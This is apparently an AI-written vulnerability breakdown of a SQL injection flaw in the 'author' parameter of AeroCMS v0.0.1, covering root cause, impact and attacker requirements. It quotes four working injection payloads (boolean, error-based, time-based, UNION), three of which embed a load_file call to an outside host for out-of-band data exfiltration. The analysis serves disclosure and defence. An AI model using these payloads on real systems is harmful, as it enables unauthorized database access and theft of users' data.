Based on the provided content, here's the breakdown of the vulnerability:

**Root Cause:**

*   The `author` parameter in the AeroCMS v0.0.1 CMS is vulnerable to SQL injection due to insufficient input sanitization.

**Weaknesses/Vulnerabilities:**

*   **SQL Injection:** The primary vulnerability is SQL injection, allowing an attacker to manipulate database queries.
*   The application fails to properly sanitize user input provided through the `author` parameter, leading to the vulnerability.

**Impact of Exploitation:**

*   **Database Dump/Theft:** Attackers can extract sensitive information from the database, including user credentials, personal data, or other confidential information.
*   **Malicious Use of Data:** Stolen data can be used for various malicious purposes, including identity theft, financial fraud, and further attacks on the system or its users.
*   **Potential for Full System Compromise:** Depending on the database privileges and the application's configuration, successful SQL injection can lead to a full compromise of the affected server.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is exploited through the `author` parameter, which is part of a GET request.
*   **Direct Parameter Manipulation:** An attacker modifies the `author` parameter with crafted SQL queries to manipulate the database.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to be able to send HTTP GET requests to the vulnerable AeroCMS system.
*   **Basic SQL Knowledge:** The attacker needs a basic understanding of SQL injection techniques to craft the malicious payloads.
*   **No Authentication Required:** This vulnerability can be exploited without prior authentication.

**Technical Details:**

*   The exploit details include different SQL injection techniques:
    *   Boolean-based blind SQL injection
    *   Error-based SQL injection (using `FLOOR` and `CONCAT` functions)
    *   Time-based blind SQL injection (using `SLEEP` function)
    *   UNION query-based SQL injection

*   Payload examples are provided for each of these types of SQL injection, such as:
    *   `author=-5045' OR 8646=8646 AND 'YeVm'='YeVm&p_id=4` (boolean-based)
    *   `author=admin'+(select load_file('\\\\7z7rajg38ugkp9dswbo345g0nrtkha518pzcp0e.kufar.com\\pvq'))+'' OR (SELECT 7539 FROM(SELECT COUNT(*),CONCAT(0x717a6a6a71,(SELECT (ELT(7539=7539,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'mwLN'='mwLN&p_id=4` (error-based)
    *  `author=admin'+(select load_file('\\\\7z7rajg38ugkp9dswbo345g0nrtkha518pzcp0e.kufar.com\\pvq'))+'' AND (SELECT 6824 FROM (SELECT(SLEEP(5)))QfTF) AND 'zVTI'='zVTI&p_id=4` (time-based)
    * `author=admin'+(select load_file('\\\\7z7rajg38ugkp9dswbo345g0nrtkha518pzcp0e.kufar.com\\pvq'))+'' UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6a71,0x4f617a456c7953617866546b7a666d49434d644662587149734b6d517a4e674d5471615a73616d58,0x7170716b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&p_id=4` (UNION query)
*   The payloads are designed to extract information from the database by injecting malicious SQL statements through the vulnerable `author` parameter.
